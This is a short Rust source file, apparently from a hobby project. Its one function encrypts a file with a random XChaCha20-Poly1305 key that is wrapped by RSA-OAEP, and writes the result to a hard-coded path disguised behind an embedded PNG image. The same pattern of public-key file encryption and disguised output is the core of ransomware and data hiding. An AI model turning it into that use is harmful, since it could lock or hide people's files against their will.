use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use chacha20poly1305::aead::OsRng;
use chacha20poly1305::aead::stream::EncryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use rand::prelude::ThreadRng;
use rand::RngCore;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha512;
use crate::BIGRAT_PNG;

const BUFFER_SIZE: usize = 500;

pub fn encrypt_file(
    source_file: &mut File,
    public_key: RsaPublicKey,
    rng: &mut ThreadRng,
) -> anyhow::Result<()> {
    let mut dist_file = OpenOptions::new()
        .append(true)
        .create(true)
        .open("/home/rafal/boykisser-rat.png")?;

    dist_file.set_len(0)?;
    dist_file.write_all(BIGRAT_PNG)?;

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)?;
    dist_file.write_all(encrypted_key.as_slice())?;
    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)?;
    dist_file.write_all(encrypted_nonce.as_slice())?;

    let aead = XChaCha20Poly1305::new(key.as_ref().into());
    let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    let mut buffer = [0u8; BUFFER_SIZE];
    loop {
        let read_count = source_file.read(&mut buffer)?;
        if read_count == BUFFER_SIZE {
            let ciphertext = stream_encryptor.encrypt_next(buffer.as_slice()).unwrap();
            let _ = dist_file.write(&ciphertext)?;
        } else {
            let ciphertext = stream_encryptor.encrypt_last(&buffer[..read_count]).unwrap();
            let _ = dist_file.write(&ciphertext)?;
            break;
        }
    }

    Ok(())
}
